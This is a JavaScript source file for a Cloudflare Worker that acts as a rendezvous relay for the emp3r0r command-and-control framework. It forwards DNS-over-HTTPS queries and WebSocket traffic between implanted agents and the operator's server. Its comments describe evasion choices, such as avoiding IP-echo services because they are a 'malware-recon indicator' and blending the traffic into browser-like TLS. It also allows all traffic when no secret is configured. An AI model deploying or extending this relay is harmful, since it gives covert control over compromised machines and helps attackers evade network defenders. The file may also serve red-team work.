/**
 * emp3r0r CF Worker Relay — rendezvous relay for C2 over Cloudflare Workers
 *
 * Routes:
 *   GET  /            -> health / info
 *   POST /dns         -> RFC 8484 DoH relay (application/dns-message)
 *   GET  /dns?dns=... -> RFC 8484 DoH relay (GET form)
 *   GET  /ws/<room>   -> WebSocket relay endpoint (data plane)
 *
 * Data plane design:
 *   - A "room" is a Durable Object instance (one per room id, sharded by DO name).
 *   - First party to join with role=cc becomes the CC end; agents join as role=agent.
 *   - All bytes are opaque: the payload is AES-GCM ciphertext (SecureConn) end-to-end;
 *     the Worker never sees plaintext and does not participate in auth (MsgAuth is in-band).
 *   - Hibernation API keeps DO memory/CPU cost near zero while WebSockets idle.
 *
 * Compatibility:
 *   - Agents speak `cdn2proxy`-style WebSocket; CC reverse-dials the same endpoint
 *     with role=cc. Both sides wrap the socket in the existing SecureConn/MsgAuth stack.
 */

export { RelayDO } from './relay_do.js';

let SHARED_SECRET = ''; // set from env in fetch()

/** Constant-time-ish string compare */
function secretOK(provided) {
  if (!SHARED_SECRET) return true; // not configured -> allow (dev mode)
  if (!provided || provided.length !== SHARED_SECRET.length) return false;
  let diff = 0;
  for (let i = 0; i < SHARED_SECRET.length; i++) {
    diff |= provided.charCodeAt(i) ^ SHARED_SECRET.charCodeAt(i);
  }
  return diff === 0;
}

/** Public DNS resolvers used by the DoH relay (upstream). */
const DOH_UPSTREAMS_BUILTIN = [
  'https://cloudflare-dns.com/dns-query',
  'https://dns.google/dns-query',
  'https://doh.mullvad.net/dns-query',
  'https://doh.opendns.com/dns-query',
  'https://dns.adguard-dns.com/dns-query',
  'https://1.1.1.1/dns-query',
  'https://9.9.9.9/dns-query',
];

export default {
  async fetch(request, env, ctx) {
    SHARED_SECRET = (env && env.EMP_SHARED_SECRET) || '';
    const url = new URL(request.url);
    const path = url.pathname;

    // CORS for operator UI / agent fetches if ever needed from browsers
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        status: 204,
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Authorization, Content-Type',
          'Access-Control-Max-Age': '86400',
        },
      });
    }

    // ---------- health ----------
    if (path === '/' || path === '/health') {
      return new Response(
        JSON.stringify({
          ok: true,
          service: 'emp3r0r-cf-relay',
          routes: ['/dns (DoH)', '/ws/<room>?role=<cc|agent>&secret=<shared-secret>'],
          time: new Date().toISOString(),
        }),
        { headers: { 'content-type': 'application/json' } }
      );
    }

    // ---------- DoH relay (RFC 8484) ----------
    if (path === '/dns' || path === '/dns-query') {
      return handleDoH(request, env, ctx);
    }

    // ---------- external IP echo (agent self-report) ----------
    // The CC only ever sees the relay (CF edge) address, so agents
    // self-report their egress IP. Asking a third-party "echo your IP"
    // service (ipify & co) is a classic malware-recon indicator and would
    // carry a Go TLS fingerprint — asking our own Worker instead rides
    // the same domain and the same browser-fingerprinted TLS as the WS
    // channel. CF-Connecting-IP is the client's real address.
    if (path === '/extip') {
      const provided =
        (request.headers.get('authorization') || '').replace(/^Bearer\s+/i, '') ||
        url.searchParams.get('secret') ||
        '';
      if (!secretOK(provided)) {
        return new Response('unauthorized', { status: 401 });
      }
      const ip = request.headers.get('CF-Connecting-IP') || '';
      return new Response(ip, { headers: { 'content-type': 'text/plain' } });
    }

    // ---------- WebSocket relay ----------
    if (path.startsWith('/ws/')) {
      return handleWebSocket(request, env, ctx);
    }

    return new Response('not found', { status: 404 });
  },
};

// ---------------------------------------------------------------------------
// DoH relay: forwards application/dns-message bodies to a real resolver.
// Optimally the agent would talk straight to 1.1.1.1 — but forced-proxied
// networks often allow only your own domain; the Worker also lets us pin
// SVCB/HTTPS discovery later without client-side trust changes.
// ---------------------------------------------------------------------------
async function handleDoH(request, env, ctx) {
  // auth: shared secret via Authorization bearer or ?secret=
  const url = new URL(request.url);
  const provided =
    (request.headers.get('authorization') || '').replace(/^Bearer\s+/i, '') ||
    url.searchParams.get('secret') ||
    '';
  if (!secretOK(provided)) {
    return new Response('unauthorized', { status: 401 });
  }

  let upstreamBody = null;
  let method = 'GET';

  const buildUrl = (base) =>
    method === 'POST' ? base : `${base}?dns=${encodeURIComponent(url.searchParams.get('dns'))}`;

  if (request.method === 'POST') {
    const ct = request.headers.get('content-type') || '';
    if (!ct.includes('application/dns-message')) {
      return new Response('content-type must be application/dns-message', { status: 415 });
    }
    upstreamBody = await request.arrayBuffer();
    method = 'POST';
  } else if (request.method === 'GET') {
    if (!url.searchParams.get('dns')) {
      return new Response('missing ?dns= parameter (RFC 8484 GET form)', { status: 400 });
    }
    method = 'GET';
  } else {
    return new Response('method not allowed', { status: 405 });
  }

  // Try upstreams in order; Workers egress usually reaches at least one.
  let lastErr = null;
  for (const base of DOH_UPSTREAMS_BUILTIN) {
    try {
      const upstream = await fetch(buildUrl(base), {
        method,
        headers: { accept: 'application/dns-message' },
        body: upstreamBody,
        signal: AbortSignal.timeout(5000),
      });
      if (upstream.ok) {
        return new Response(upstream.body, {
          status: 200,
          headers: {
            'content-type': upstream.headers.get('content-type') || 'application/dns-message',
            'cache-control': 'no-store',
            'access-control-allow-origin': '*',
          },
        });
      }
      lastErr = new Error(`upstream ${base} -> HTTP ${upstream.status}`);
    } catch (e) {
      lastErr = e;
    }
  }
  return new Response(`DoH upstream failure: ${lastErr}`, { status: 502 });
}

// ---------------------------------------------------------------------------
// WebSocket relay: proxies the connection into a per-room Durable Object.
// ---------------------------------------------------------------------------
async function handleWebSocket(request, env, ctx) {
  const url = new URL(request.url);
  const parts = url.pathname.split('/').filter(Boolean); // ['ws', '<room>']
  if (parts.length !== 2) {
    return new Response('usage: /ws/<room>?role=<cc|agent>&secret=<secret>', { status: 400 });
  }
  const roomId = parts[1];
  const role = url.searchParams.get('role') || 'agent';
  const provided =
    (request.headers.get('authorization') || '').replace(/^Bearer\s+/i, '') ||
    url.searchParams.get('secret') ||
    '';
  if (role !== 'cc' && role !== 'agent') {
    return new Response('role must be cc or agent', { status: 400 });
  }
  if (!secretOK(provided)) {
    return new Response('unauthorized', { status: 401 });
  }
  const upgradeHeader = request.headers.get('upgrade');
  if (!upgradeHeader || upgradeHeader.toLowerCase() !== 'websocket') {
    return new Response('expected websocket upgrade', { status: 426 });
  }

  // One DO per room id; the DO creates the WebSocketPair and returns 101.
  const doId = env.RELAY_DO.idFromName(roomId);
  const stub = env.RELAY_DO.get(doId);
  return stub.fetch(request);
}
